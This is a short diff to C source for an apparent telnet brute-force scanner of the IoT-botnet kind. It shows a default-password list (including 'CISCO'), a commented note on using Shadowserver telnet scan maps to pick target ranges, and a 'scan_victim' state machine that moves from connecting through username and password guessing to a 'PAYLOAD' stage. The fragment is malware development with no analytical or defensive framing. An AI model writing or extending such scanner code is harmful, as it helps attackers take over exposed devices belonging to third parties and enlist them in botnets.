@@ -22,6 +22,18 @@ static char *passwords[] =
 	"CISCO\r\n\0"
 };
 
+
+/*
+https://telnetscan.shadowserver.org/
+https://telnetscan.shadowserver.org/all/telnet_hilbert_1024_current.png
+Good ranges?
+
+static char *ranges[] =
+{
+	// Add these bitch
+};
+*/
+
 struct pseudo_header
 { //needed for checksum calculation
 	unsigned int   source_address;
@@ -36,11 +48,17 @@ struct pseudo_header
 struct scan_victim
 {
 	ipv4_t ip;
-	uint8_t state;
+	enum
+	{
+		CONNECTING,
+		USERNAME,
+		PASSWORD,
+		PAYLOAD,
+		FINISHED,
+	} state;
 	int32_t sock;
-	int  user;
-	int  pass;
-	char prompt[5]; // How the prompt looks to match it and collect data
+	uint8_t user;
+	uint8_t pass;
 };
 
 void scan_init();
